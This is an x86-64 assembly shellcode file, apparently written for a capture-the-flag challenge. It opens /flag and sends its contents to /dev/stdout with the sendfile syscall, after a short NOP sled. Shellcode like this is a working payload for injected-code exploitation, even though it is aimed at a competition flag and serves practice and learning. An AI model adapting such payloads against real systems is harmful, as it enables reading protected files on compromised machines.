global _start


section .text
_start:
nops:
        times 6 db 0x90

        ; Same shellcode from first chall, just for nostalgia
        ; Open flag
        mov rax, 2
        lea rdi, [rel flagname]
        mov rsi, 0
        mov rdx, 1
        syscall

        ; Open /dev/stdout, not always fixed to 1 for somereason
        push rax
        mov rax, 2
        lea rdi, [rel stdout]
        mov rsi, 2
        mov rdx, 1
        syscall

        ; call sendfile syscall to stdout
        mov rdi, rax
        pop rsi
        mov rax, 40
        mov rdx, 0
        mov r10, 1000
        syscall

        mov rax, 60
        syscall

flagname:
        db "/flag", 0
stdout:
        db "/dev/stdout", 0
